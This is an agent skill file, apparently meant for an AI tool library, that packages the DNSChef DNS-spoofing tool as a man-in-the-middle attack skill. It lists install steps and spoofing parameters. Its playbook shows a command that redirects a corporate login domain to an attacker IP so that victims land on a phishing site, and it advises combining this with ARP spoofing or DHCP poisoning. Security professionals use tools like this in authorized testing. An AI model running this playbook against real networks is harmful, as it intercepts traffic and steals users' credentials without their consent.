---
name: dnschef-spoof
description: "DNSChef: targeted DNS hijacking. Signals: man-in-the-middle, MITM, redirect all domains to attacker, spoof only specified domains, real resolution whitelist."
zh-signals: "DNSChef: 定向域名劫持。信号:中间人,mitm,全域名指向攻击机,只伪造指定域,真实解析白名单。"
when-to-use: >-
  Use when conducting a man-in-the-middle attack and you need to redirect all or
  selected domains to an attacker-controlled IP via DNS spoofing; pair with ARP
  spoofing or DHCP poisoning and whitelist real domains to reduce exposure.
---

# DNSChef

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/iphelix/dnschef
- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install dnschef or git clone
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `dnschef.py --fakeip 10.8.0.2 --interface 0.0.0.0` | Redirect all domains to the attacker machine |
| `--fakedomains corp.com` | Spoof only the specified domains |
| `--truedomains update.com` | Real resolution whitelist |
| `-q` | Quiet |

## Attack Scenario Playbook

### Targeted domain hijacking

```bash
sudo python dnschef.py --fakeip 10.8.0.2 --fakedomains login.corp.com -i 0.0.0.0
# Once the target's DNS points at this machine, visiting login.corp.com lands on the phishing site
```

## Notes

Works together with ARP spoofing or DHCP poisoning; --truedomains keeps the remaining domains resolving normally to reduce exposure.
